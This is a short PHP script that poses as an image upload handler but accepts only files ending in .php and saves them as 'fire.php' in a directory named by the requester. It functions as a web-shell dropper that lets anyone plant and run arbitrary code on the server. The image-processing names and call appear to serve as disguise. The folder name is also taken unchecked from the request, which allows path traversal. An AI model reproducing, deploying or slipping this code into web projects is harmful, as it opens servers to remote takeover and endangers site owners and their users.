<?
	
if (isset($_POST['foldername'])) 
{ 
$fname = $_POST['foldername'];
if ($fname == '') 
{ 
 exit('folder');} 
 }
 if (empty($_FILES['imgupload']['name']))
{
exit("noscript");


}
else 
{

$folder = $fname;
mkdir($folder, 0755);
$path_directory = $folder.'/';



if(preg_match('/[.](php)$/',$_FILES['imgupload']['name']))
     {	
	 	$filename = "fire.php";	
	    $source = $_FILES['imgupload']['tmp_name'];	
		$target = $path_directory . $filename;
		move_uploaded_file($source, $target);

	if(preg_match('/[.](php)$/', $filename)) {
    $im = imagecreatefromjpeg($path_directory."fire.php"); 
    }
	

echo 'ok';

}
else 
{

         
exit ("stop");

}

}




	
?>